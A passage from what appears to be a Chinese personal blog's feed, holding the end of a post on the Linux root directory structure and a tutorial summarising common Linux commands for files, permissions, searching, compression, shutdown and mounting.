举例来说，WWW伺服器需要的网页资料就可以放置在/srv/www/里面。呵呵，看来平时我们编写的代码应该放到这里了。</td><td>服务启动后需要访问的数据目录</td><td></td></tr><tr><td>/tmp</td><td>这是让一般使用者或者是正在执行的程序暂时放置档案的地方。这个目录是任何人都能够存取的，所以你需要定期的清理一下。当然，重要资料不可放置在此目录啊！ 因为FHS甚至建议在开机时，应该要将/tmp下的资料都删除！</td><td>存放临时文件目录</td><td>所有用户对该目录均可读写</td></tr></tbody></table><h3 id="font-color-brown2根目录下的结构font"><a class="markdownIt-Anchor" href="#font-color-brown2根目录下的结构font"></a> <font color="brown">2.根目录下的结构</font></h3><h4 id="tree-命令"><a class="markdownIt-Anchor" href="#tree-命令"></a> <code>tree 命令</code></h4><blockquote><p>使用tree 可以查看详细的目录树</p></blockquote><h4 id="根目录下的结构图"><a class="markdownIt-Anchor" href="#根目录下的结构图"></a> <code>根目录下的结构图</code></h4><p><img src="/images/105-1.png" alt></p><h4 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> <code>注意</code></h4><blockquote><ul><li>/etc：设定档</li><li>/bin：重要执行档</li><li>/dev：所需要的装置档案</li><li>/lib：执行档所需的函式库与核心所需的模组</li><li>/sbin：重要的系统执行档</li></ul></blockquote><p>这五个目录<strong>千万不可</strong>与根目录分开在不同的分区！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;根目录是整个系统最重要的一个目录，因为不但所有的目录都是由根目录衍生出来的，同时根目录也与开机/还原/系统修复等动作有关。因此FHS标准&lt;strong&gt;建议&lt;/strong&gt;： &lt;strong&gt;根目录(/)所在分区应该越小越好&lt;/strong&gt;，且
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="知识库" scheme="https://muzibing.github.io/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    
      <category term="Linux" scheme="https://muzibing.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux常用命令总结（二进制）</title>
    <link href="https://muzibing.github.io/2020/03/20/2020.03.20%EF%BC%88104%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/20/2020.03.20（104）/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-05-01T13:37:19.175Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown0x00-目录操作命令font"><a class="markdownIt-Anchor" href="#font-color-brown0x00-目录操作命令font"></a> <font color="brown"><code>0x00 目录操作命令</code></font></h3><h4 id="font-color-navy0x00-lslistfont"><a class="markdownIt-Anchor" href="#font-color-navy0x00-lslistfont"></a> <font color="navy"><code>0x00 ls（list）</code></font></h4><p><code>功能</code>：列举出当前工作目录的内容，包括文件和文件夹</p><p><code>相关选项</code>：</p><blockquote><p><code>ls -l</code>： 文件/文件夹：长格式显示指定/目录中的文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@# ls -l 图片1.png</span><br><span class="line">-rwxrwxrwx   1      root  root 43531 Mar 16 13:02 图片1.png</span><br><span class="line">   权限位   引用计数  所有者  属组  大小   最后一次修改时间   文件名</span><br><span class="line">   </span><br><span class="line">root@# ls -l 文件夹</span><br><span class="line">-rwxrwxrwx 1 root root  645653 Mar 18 10:25 5d0b02281396a.png</span><br><span class="line">-rwxrwxrwx 1 root root 1139867 Feb 23 12:09 IMG_1074.jpg</span><br><span class="line">-rwxrwxrwx 1 root root 2282681 Feb 14 15:54 IMG_1093-2.jpg</span><br><span class="line">    权限位   引用计数  所有者  属组  大小   最后一次修改时间   文件名</span><br></pre></td></tr></table></figure><blockquote><p><code>ls -a</code>：显示所有文件，包含隐藏文件</p></blockquote><h4 id="font-colornavy0x01-cdchange-directoryfont"><a class="markdownIt-Anchor" href="#font-colornavy0x01-cdchange-directoryfont"></a> <font color="navy"><code>0x01 cd（Change Directory）</code></font></h4><p><code>作用</code>：切换文件路径，cd 将给定的文件夹（或目录）设置成当前工作目录</p><p><code>功能</code>：</p><blockquote><p><code>cd ~</code>：进入当前用户的home目录</p><p><code>cd -</code>：进入上次目录</p><p><code>cd ..</code> ：进入上一级目录</p></blockquote><h4 id="font-color-navy0x02-pwdprint-working-directoryfont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-pwdprint-working-directoryfont"></a> <font color="navy"><code>0x02 pwd（print working directory）</code></font></h4><p><code>功能</code>：显示当前工作目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@:/mnt/d/Program# pwd</span><br><span class="line">/mnt/d/Program</span><br></pre></td></tr></table></figure><p><code>相关选项</code>：无</p><p><code>附加知识点</code>：Linux 常见目录及作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">/ 根目录</span><br><span class="line"></span><br><span class="line">/bin 命令保存目录（普通用户就可以读取的命令）</span><br><span class="line"></span><br><span class="line">/boot 启动目录，启动相关文件</span><br><span class="line"></span><br><span class="line">/dev 设备文件保存目录</span><br><span class="line"></span><br><span class="line">/etc 配置文件保存目录</span><br><span class="line"></span><br><span class="line">/home 普通用户的家目录</span><br><span class="line"></span><br><span class="line">/lib 系统库保存目录</span><br><span class="line"></span><br><span class="line">/mnt 系统挂载目录</span><br><span class="line"></span><br><span class="line">/media 挂载目录</span><br><span class="line"></span><br><span class="line">/root 超级用户的家目录</span><br><span class="line"></span><br><span class="line">/tmp 临时目录</span><br><span class="line"></span><br><span class="line">/sbin 命令保存目录（超级用户才能使用的目录）</span><br><span class="line"></span><br><span class="line">/proc 直接写入内存的</span><br><span class="line"></span><br><span class="line">/sys 将内核的一些信息映射，可供应用程序所用</span><br><span class="line"></span><br><span class="line">/usr 系统软件资源目录</span><br><span class="line"></span><br><span class="line">/usr/bin/ 系统命令（普通用户）</span><br><span class="line"></span><br><span class="line">/usr/sbin/ 系统命令（超级用户）</span><br><span class="line"></span><br><span class="line">/var 系统相关文档内容</span><br><span class="line"></span><br><span class="line">/var/log/ 系统日志位置</span><br><span class="line"></span><br><span class="line">/var/spool/mail/系统默认邮箱位置</span><br><span class="line"></span><br><span class="line">/var/lib/ 默认安装的库文件目录</span><br></pre></td></tr></table></figure><h4 id="font-color-navy0x03-mkdirmake-directoriesfont"><a class="markdownIt-Anchor" href="#font-color-navy0x03-mkdirmake-directoriesfont"></a> <font color="navy"><code>0x03 mkdir（make directories）</code></font></h4><p><code>功能</code>：用于新建一个新目录</p><p><code>相关选项</code>：</p><blockquote><p><code>mkdir test</code>：创建名为test的目录</p><p><code>mkdir -p test1/test2/test3</code>：递归创建</p></blockquote><h4 id="font-color-navy0x04-rmdirremove-directoriesfont"><a class="markdownIt-Anchor" href="#font-color-navy0x04-rmdirremove-directoriesfont"></a> <font color="navy"><code>0x04 rmdir（remove directories）</code></font></h4><p><code>功能</code>：删除给定的目录（只能删除空目录）</p><p><code>相关选项</code>：</p><h3 id="font-color-brown0x01-文件操作命令font"><a class="markdownIt-Anchor" href="#font-color-brown0x01-文件操作命令font"></a> <font color="brown"><code>0x01 文件操作命令</code></font></h3><h4 id="font-color-navy0x00-touchtouchfont"><a class="markdownIt-Anchor" href="#font-color-navy0x00-touchtouchfont"></a> <font color="navy"><code>0x00 touch（touch）</code></font></h4><p><code>功能</code>：创建空文件或修改文件时间</p><p><code>例子</code></p><blockquote><p><code>touch test.py</code>：创建空文件，如果文件存在，则修改文件创建时间</p></blockquote><h4 id="font-color-navy0x01-rmremovefont"><a class="markdownIt-Anchor" href="#font-color-navy0x01-rmremovefont"></a> <font color="navy"><code>0x01 rm（remove）</code></font></h4><p><code>功能</code>：删除给定的文件</p><p><code>相关选项</code>：</p><blockquote><p><code>rm -r 目录名</code>： 递归删除文件和目录</p><p><code>rm -r *</code>：删除当前目录下的所有文件及目录</p><p><code>rm -f 文件名</code> ： 强制删除</p><p><code>rm -rf 目录名</code>:  强制删除目录和文件</p></blockquote><h4 id="font-color-navy0x02-catconcatenate-and-print-filesfont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-catconcatenate-and-print-filesfont"></a> <font color="navy"><code>0x02 cat（concatenate and print files）</code></font></h4><p><code>功能</code>：用于在标准输出（监控器或屏幕）上查看文件内容</p><p><code>相关选项</code>：</p><blockquote><p><code>-n</code>：由 1 开始对所有输出的行数编号</p><p><code>-b</code>：和 -n 相似，只不过对于空白行不编号</p><p><code>-E</code>： 在每行结束处显示 $</p></blockquote><h4 id="font-color-navy0x03-morefont"><a class="markdownIt-Anchor" href="#font-color-navy0x03-morefont"></a> <font color="navy"><code>0x03 more</code></font></h4><p><code>功能</code>：命令类似 cat ，不过会以一页一页的形式显示</p><p><code>相关选项</code>：</p><blockquote><p><code>空格键</code>：向上翻页</p><p><code>b</code>：向下翻页</p><p><code>p</code>：退出查看</p></blockquote><h4 id="font-color-navy0x04-cpcopyfont"><a class="markdownIt-Anchor" href="#font-color-navy0x04-cpcopyfont"></a> <font color="navy"><code>0x04 cp（copy）</code></font></h4><p><code>功能</code>：对文件或目录进行复制</p><p><code>相关选项</code>：</p><blockquote><p>cp 源文件 目标位置 (复制)</p><p>cp 源文件 目标位置/目标名称 (复制并改名)</p><p><code>cp -r test/ newtest</code> ：复制目录</p><p><code>cp -p</code>：除复制文件的内容外，还把修改时间和访问权限也复制到新文件中</p><p><code>cp -d</code>：若源文件是链接文件，则复制链接属性</p><p><code>cp -a</code>：相当于 <code>cp -pdr</code></p></blockquote><h4 id="font-color-navy0x05-mvmovefont"><a class="markdownIt-Anchor" href="#font-color-navy0x05-mvmovefont"></a> <font color="navy"><code>0x05 mv（move）</code></font></h4><p><code>功能</code>：命令对文件或文件夹进行移动，如果文件或文件夹存在于当前工作目录，还可以对文件或文件夹进行重命名</p><table><thead><tr><th style="text-align:left">命令格式</th><th style="text-align:left">运行结果</th></tr></thead><tbody><tr><td style="text-align:left">mv 文件名 文件名</td><td style="text-align:left">将源文件名改为目标文件名</td></tr><tr><td style="text-align:left">mv 文件名 目录名</td><td style="text-align:left">将文件移动到目标目录</td></tr><tr><td style="text-align:left">mv 目录名 目录名</td><td style="text-align:left">目标目录已存在，将源目录移动到目标目录；目标目录不存在则改名</td></tr><tr><td style="text-align:left">mv 目录名 文件名</td><td style="text-align:left">出错</td></tr></tbody></table><p><code>相关选项</code>：</p><blockquote><p><code>mv -i</code>：若指定目录已有同名文件，则先询问是否覆盖旧文件;</p><p><code>mv -f</code>：在 mv 操作要覆盖某已有的目标文件时不给任何指示;</p></blockquote><p><code>实例</code></p><p>目标目录与原目录一致，指定了新文件名，效果就是仅仅重命名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv  /home/ffxhd/a.txt   /home/ffxhd/b.txt</span><br></pre></td></tr></table></figure><p>目标目录与原目录不一致，没有指定新文件名，效果就是仅仅移动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv  /home/ffxhd/a.txt   /home/ffxhd/test/ </span><br><span class="line">或者</span><br><span class="line">mv  /home/ffxhd/a.txt   /home/ffxhd/test</span><br></pre></td></tr></table></figure><p>目标目录与原目录不一致, 指定了新文件名，效果就是：移动 + 重命名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv  /home/ffxhd/a.txt   /home/ffxhd/test/c.txt</span><br></pre></td></tr></table></figure><h4 id="font-colornavy0x06-catcatenate连锁font"><a class="markdownIt-Anchor" href="#font-colornavy0x06-catcatenate连锁font"></a> <font color="navy"><code>0x06 cat（Catenate，连锁）</code></font></h4><p><code>功能</code>：用于连接文件并打印到标准输出设备上</p><p><code>相关选项</code>：</p><blockquote><ul><li><strong>-n</strong>：由 1 开始对所有输出的行数编号</li><li><strong>-b</strong>：和 -n 相似，只不过对于空白行不编号</li><li><strong>-s</strong>：当遇到有连续两行以上的空白行，就代换为一行的空白行</li><li><strong>-E 或 --show-ends</strong> : 在每行结束处显示 $。</li></ul></blockquote><p><code>相关实例</code></p><p>把 textfile1 的文档内容加上行号后输入 textfile2 这个文档里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -n textfile1 &gt; textfile2</span><br></pre></td></tr></table></figure><p>把 textfile1 和 textfile2 的文档内容加上行号（空白行不加）之后将内容附加到 textfile3 文档里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -b textfile1 textfile2 &gt;&gt; textfile3</span><br></pre></td></tr></table></figure><p>抓取文件中感兴趣的关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 文件 | grep 关键字</span><br></pre></td></tr></table></figure><p><strong>cat创建文件</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">法一：cat &gt; 文件名 &lt;&lt;结束标记</span><br><span class="line">如果文件名已经存在，那么上述的命令格式会覆盖原来文件中的内容，</span><br><span class="line">要想不覆盖则用下面的：</span><br><span class="line">cat &gt;&gt; 文件名 &lt;&lt;结束标记</span><br><span class="line">=====================================</span><br><span class="line">法二：仅用cat &gt; 文件名，然后Ctrl + C退出bash</span><br></pre></td></tr></table></figure><p><img src="/images/104-1.png" alt="这里写图片描述"></p><blockquote><p>这篇可以看一下<a href="https://blog.csdn.net/XD_hebuters/article/details/79204812" target="_blank" rel="noopener">Linux cat命令使用</a></p></blockquote><h3 id="font-color-brown0x02-权限管理font"><a class="markdownIt-Anchor" href="#font-color-brown0x02-权限管理font"></a> <font color="brown"><code>0x02 权限管理</code></font></h3><p><a href>有关权限位请看我的另一篇博客：linux的权限位</a>，这里就再简单的介绍一下：</p><p><code>权限位</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-rwxrwxrwx   1      root  root 43531 Mar 16 13:02 图片1.png</span><br><span class="line">   权限位   引用计数  所有者  属组  大小   最后一次修改时间   文件名</span><br></pre></td></tr></table></figure><p><code>权限位的个数</code>：<strong>权限位是十位</strong></p><blockquote><p>第一位：代表文件类型</p><p>        ▧  -：普通文件<br>        ▧  d：目录文件<br>        ▧   l：链接文件</p><p>其他九位：代表各用户的权限<br>        ▧  前三位：属主权限u<br>        ▧   中间三位：属组权限g<br>        ▧   后三位：其他人权限o</p></blockquote><p><code>r、w、x</code>：</p><blockquote><p>r 表示文件可读，用数字 4 来代表</p><p>w 表示文件可写，用数字 2 来代表</p><p>x 表示文件可执行，用数字 1 来代表</p></blockquote><p><code>权限意义</code>：</p><blockquote><p><strong>⇲ 权限对文件的含义：</strong></p><p>        ▧  r：读取文件内容 如：cat、more、head、tail<br>        ▧  w：编辑、新增、修改文件内容 如：vi、echo 但是不包含删除文件<br>        ▧  x：可执行 /tmp/11/22/abc</p><p><strong>⇲ 权限对目录的含义：</strong><br>        ▧  r：可以查询目录下文件名 如：ls<br>        ▧  w：具有修改目录结构的权限 如：touch、rm、mv、cp<br>        ▧  x：可以进入目录 如：cd</p></blockquote><h4 id="font-color-navy0x00-chmodchange-the-permissions-mode-of-a-filefont"><a class="markdownIt-Anchor" href="#font-color-navy0x00-chmodchange-the-permissions-mode-of-a-filefont"></a> <font color="navy"><code>0x00 chmod（change the permissions mode of a file）</code></font></h4><p><code>功能</code>：修改权限</p><p><code>相关选项</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ugoa...][[+-=][rwxX]...][,...]</span><br></pre></td></tr></table></figure><p>其中：</p><p>        ▧  u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是</p><p>        ▧  + 表示增加权限、- 表示取消权限、= 表示唯一设定权限</p><p>        ▧  r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行</p><p>其他参数说明：</p><p>        ▧  -v : 显示权限变更的详细资料</p><p>        ▧  -R : 对目前目录下的所有文件与子目录进行相同的权限变更(即以递回的方式逐个变更)</p><p><code>实例</code>：</p><p>将文件 file1.txt 设为所有人皆可读取 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ugo+r file1.txt</span><br></pre></td></tr></table></figure><p>将文件 file1.txt 设为所有人皆可读取 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a+r file1.txt</span><br></pre></td></tr></table></figure><p>将文件 file1.txt 与 file2.txt 设为该文件拥有者，与其所属同一个群体者可写入，但其他以外的人则不可写入 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ug+w,o-w file1.txt file2.txt</span><br></pre></td></tr></table></figure><p>将 <a href="http://ex1.py" target="_blank" rel="noopener">ex1.py</a> 设定为只有该文件拥有者可以执行 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x ex1.py</span><br></pre></td></tr></table></figure><p>将目前目录下的所有文件与子目录皆设为任何人可读取 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R a+r *</span><br></pre></td></tr></table></figure><p>此外chmod也可以用数字来表示权限如 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 file</span><br></pre></td></tr></table></figure><p>语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod abc file</span><br></pre></td></tr></table></figure><p>其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。</p><p><strong>r=4，w=2，x=1</strong></p><ul><li>若要rwx属性则4+2+1=7；</li><li>若要rw-属性则4+2=6；</li><li>若要r-x属性则4+1=5。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a=rwx file</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 file</span><br></pre></td></tr></table></figure><p>效果相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ug=rwx,o=x file</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 771 file</span><br></pre></td></tr></table></figure><h3 id="font-color-brown0x03-帮助命令font"><a class="markdownIt-Anchor" href="#font-color-brown0x03-帮助命令font"></a> <font color="brown"><code>0x03 帮助命令</code></font></h3><h4 id="font-color-navy0x00-manmanualfont"><a class="markdownIt-Anchor" href="#font-color-navy0x00-manmanualfont"></a> <font color="navy"><code>0x00 man（manual）</code></font></h4><p><code>功能</code>：查看命令的帮助</p><h4 id="font-color-navy0x01-helpfont"><a class="markdownIt-Anchor" href="#font-color-navy0x01-helpfont"></a> <font color="navy"><code>0x01 help</code></font></h4><p><code>功能</code>：查看命令的帮助</p><h3 id="font-color-brown0x04-查找命令font"><a class="markdownIt-Anchor" href="#font-color-brown0x04-查找命令font"></a> <font color="brown"><code>0x04 查找命令</code></font></h3><h4 id="font-color-navy0x00-whereiswhereisfont"><a class="markdownIt-Anchor" href="#font-color-navy0x00-whereiswhereisfont"></a> <font color="navy"><code>0x00 whereis（whereis）</code></font></h4><p><code>功能</code>：查找命令的命令，同时看到帮助文档位置</p><p><code>实例</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@:/mnt/d/谷歌下载文件# whereis ls</span><br><span class="line">ls: /bin/ls /usr/share/man/man1/ls.1.gz</span><br></pre></td></tr></table></figure><h4 id="font-color-navy0x01-findfont"><a class="markdownIt-Anchor" href="#font-color-navy0x01-findfont"></a> <font color="navy"><code>0x01 find</code></font></h4><p><code>功能</code>：搜索命令，会在给定位置搜寻与条件匹配的文件</p><p><code>命令格式</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find 查找位置 -name 文件名</span><br></pre></td></tr></table></figure><p><code>相关选项</code>：</p><p>        ▧  -name 文件名：按照文件名查找（区分大小写二）</p><p>        ▧  -iname 文件名：按照文件名查找，不区分大小写</p><p>        ▧  -user 用户名：按照属主用户名查找文件</p><p>        ▧  -group 组名 按照属组组名查找文件</p><p>        ▧  -size 文件名：按照文件大小k M 如：find / -size +50k</p><p>        ▧  -type：按照文件类型查找(f=普通 d=目录 l=链接)</p><h4 id="font-color-navy0x02-grepfont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-grepfont"></a> <font color="navy"><code>0x02 grep</code></font></h4><p><code>功能</code>：查找符合条件的字串</p><p><code>命令格式</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep 选项 &apos;字串&apos; 查找路径</span><br></pre></td></tr></table></figure><p>比如：在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep test *file</span><br></pre></td></tr></table></figure><p><code>相关选项</code>：</p><blockquote><p>-i：忽略大小写</p><p>-v：反向选择</p><p><strong>-A</strong>：除了显示符合范本样式的那一列之外，并显示该行之后的内容</p></blockquote><p><code>相关知识：管道符 “|”</code></p><blockquote><p><code>命令1 | 命令2</code>：命令 1 的执行结果，作为命令 2 的执行条件</p><p><code>cat 文件名 | grep '字串'</code>：提取含有字符串的行</p><p><code>ls -l /etc | more</code>：分屏显示 ls 内容</p></blockquote><h3 id="font-color-brown0x05-压缩和解压缩font"><a class="markdownIt-Anchor" href="#font-color-brown0x05-压缩和解压缩font"></a> <font color="brown"><code>0x05 压缩和解压缩</code></font></h3><p><code>相关知识：</code></p><blockquote><p><strong>➤ linux可以识别的常见压缩格式</strong>：.gz .bz2</p><p><strong>➤ 常见的压缩和打包命令</strong>：.tar.gz .tar.bz2</p></blockquote><h4 id="font-color-navy0x00-tartape-archive磁带档案font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-tartape-archive磁带档案font"></a> <font color="navy"><code>0x00 tar（Tape archive，磁带档案）</code></font></h4><p><code>功能</code>：能创建、查看和提取tar压缩文件</p><p><code>命令格式</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf 压缩文件名 源文件  // 压缩文件</span><br></pre></td></tr></table></figure><p><code>相关选项</code>：</p><blockquote><p><code>创建压缩文件</code>：<code>tar -cvf 压缩文件名 源文件</code></p><p>        ▧ -c：建立新的备份文件（压缩）</p><p><code>查看压缩文件</code>：<code>tar -tvf 压缩文件名</code></p><p>        ▧ -t：列出备份文件的内容</p><p><code>提取对应压缩文件</code>：<code>tar -xvf 压缩文件名</code></p><p>        ▧ -x：从备份文件中还原文件</p><p><code>通用选项</code></p><p>        ▧ -v：显示指令执行过程</p><p>        ▧ -f：指定压缩包名</p><p><code>多个文件/目录压缩</code>：<code>tar czvf my.tar.gz file1 file2,...（file*）</code></p></blockquote><h4 id="font-color-navy0x01-gzipfont"><a class="markdownIt-Anchor" href="#font-color-navy0x01-gzipfont"></a> <font color="navy"><code>0x01 gzip</code></font></h4><p><code>功能</code>：命令创建和提取gzip压缩文件</p><p><code>相关选项</code>：</p><p>压缩相关选项：</p><blockquote><p><code>1、保留原始文件</code></p><p>如果要保留输入（原始）文件，请使用-k选项：</p><p><code>$ gzip -k filename</code></p><p>保留原始文件的另一个选项是使用-c选项，它使gzip在标准输出上写入并将输出重定向到文件：</p><p><code>$ gzip -c filename &gt; filename.gz</code></p><p><code>2、详细输出</code></p><p>如果要查看减少百分比和正在处理的文件的名称，请使用-v选项：</p><p><code>$ gzip -v filename</code></p><p>返回数据：</p><p><code>filename:　7.5% -- replaced with filename.gz</code></p><p><code>3、压缩多个文件</code></p><p>你还可以将多个文件作为参数传递给命令，例如，要压缩名为file1、file2、file3的文件，你将运行以下命令：</p><p><code>$ gzip file1 file2 file3</code></p><p>上面的命令将创建三个压缩文件：file1.gz、file2.gz、file3.gz，要想将多个文件压缩至一个压缩包</p><p><code>$ gzip file1 file2 file3 &gt; file4.gz</code></p><p><code>4、压缩目录中的所有文件</code></p><p>要压缩给定目录中的所有文件，请使用-r选项：</p><p><code>$ gzip -r directory</code></p><p>gzip将递归遍历整个目录结构并压缩目录及其子目录中的所有文件。</p></blockquote><p>解压相关选项：</p><blockquote><p>1.要解压缩.gz文件，请使用-d选项：</p><p><code>gzip -d</code>：来提取压缩文件</p><p>但是不会保留压缩文件，要想保留压缩文件，用-k选项：</p><p><code>$ gzip -dk filename.gz</code></p><p>要一次解压缩多个文件，请将文件名作为参数传递给gzip：</p><p><code>$ gzip -d file1 file2 file3</code></p><p>当与-d和-r选项一起使用时，gzip以递归方式解压缩给定目录中的所有文件：</p><p><code>$ gzip -dr directory</code></p><p>2.与-l选项一起使用时，gzip显示有关给定压缩文件的统计信息：</p><p><code>gzip -l filename</code>：列出压缩文件的相关信息</p></blockquote><h3 id="font-color-brown0x05-关机和重启命令font"><a class="markdownIt-Anchor" href="#font-color-brown0x05-关机和重启命令font"></a> <font color="brown"><code>0x05 关机和重启命令</code></font></h3><h4 id="font-color-navy0x00-shutdownfont"><a class="markdownIt-Anchor" href="#font-color-navy0x00-shutdownfont"></a> <font color="navy"><code>0x00 shutdown</code></font></h4><p><code>功能</code>：关机/重启</p><p><code>相关选项</code>：</p><blockquote><p><code>shutdown -h now</code>：立即关机</p><p><code>shutdown -r now</code>：立即重启</p><p><code>shutdown -t [seconds]</code>：设定在几秒钟之后进行关机程序</p><p><code>shutdown +5 “System will shutdown after 5 minutes”</code>：5分钟够关机并显示警告信息</p></blockquote><h4 id="font-color-navy0x01-rebootfont"><a class="markdownIt-Anchor" href="#font-color-navy0x01-rebootfont"></a> <font color="navy"><code>0x01 reboot</code></font></h4><p><code>功能</code>：关机/重启挂载（重新启动）</p><h4 id="font-color-navy0x02-mountfont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-mountfont"></a> <font color="navy"><code>0x02 mount</code></font></h4><p><code>相关知识点：光盘挂载</code></p><blockquote><ol><li><p>提一句Windows下，mount挂载，就是给磁盘分区提供一个盘符（C,D,E,…）。比如插入U盘后系统自动分配给了它I:盘符其实就是挂载，退优盘的时候进行安全弹出，其实就是卸载unmount。</p></li><li><p>Linux下，不像Windows可以有C,D,E,多个目录，Linux只有一个根目录/。在装系统时，我们分配给linux的所有区都在/下的某个位置，比如/home等等。</p></li><li><p>提问者插入了新硬盘，分了新磁盘区sdb1。它现在还不属于/。</p></li><li><p>我们虽然可以在一些图形桌面系统里找到他的位置，浏览管理里面的文件，但在命令行却不知怎么访问它的目录，比如无法使用cd或者ls。也无法在编程时指定一个目录对它操作。</p></li><li><p>这时提问者使用了 mount /dev/sdb1 ~/Share/ ，把新硬盘的区sdb1挂载到工作目录的<sub>/Share/文件夹下，之后访问这个</sub>/Share/文件夹就相当于访问这个硬盘2的sdb1分区了。对/Share/的任何操作，都相当于对sdb1里文件的操作。</p></li><li><p>所以Linux下，mount挂载的作用，就是**将一个设备（通常是存储设备）挂接到一个已存在的目录上。**访问这个目录就是访问该存储设备。</p></li><li><p>**linux操作系统将所有的设备都看作文件，它将整个计算机的资源都整合成一个大的文件目录。**我们要访问存储设备中的文件，必须将文件所在的分区挂载到一个已存在的目录上，然后通过访问这个目录来访问存储设备。挂载就是把设备放在一个目录下，让系统知道怎么管理这个设备里的文件，了解这个存储设备的可读写特性之类的过程。</p></li><li><p>我们不是有/dev/sdb1 